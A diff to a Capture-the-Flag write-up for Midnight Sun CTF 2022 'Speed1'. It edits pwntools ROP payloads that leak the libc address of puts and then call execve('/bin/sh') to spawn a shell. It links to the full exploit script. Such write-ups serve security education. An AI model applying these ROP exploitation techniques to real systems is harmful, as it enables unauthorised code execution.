@@ -49,13 +49,13 @@ POP_RSI = 0x4012b1
 BIN_SH  = 0x1b45bd
 MAIN    = 0x4011cf
 
-first_stage = flat({
+first_stage = flat(
         PADDING,
         p64(POP_RDI),
         p64(elf.got.puts),
         p64(elf.plt.puts),
         p64(MAIN)
-    })
+    )
 ```
 
 So now the binary will leak the address of puts in libc and we can parse it and get libc base like that for example : 
@@ -81,7 +81,7 @@ So our command is stored in **RDI**. By making a **POP RDI** we can put our stri
 So we need to set **RSI** to 0 then our call is equivalent to **execve("/bin/sh", NULL, NULL)**. So we are lucky there's a gadget which makes a **POP RSI** ; **POP R15**. So now we just need to build our second stage payload : 
 
 ```py
-second_stage = flat({
+second_stage = flat(
         PADDING,
         p64(POP_RDI),
         p64(libc.address + BIN_SH),
@@ -90,7 +90,7 @@ second_stage = flat({
         p64(0x0),
         p64(execve),
         p64(exit_func)
-    })
+    )
 ```
 
 Now, we can launch the [exploit](https://github.com/expressitoo/Cybersecurity/blob/main/Midnight%20Sun%20CTF%20Quals%202022/Speed1/files/exploit.py), get a shell and get the flag : 
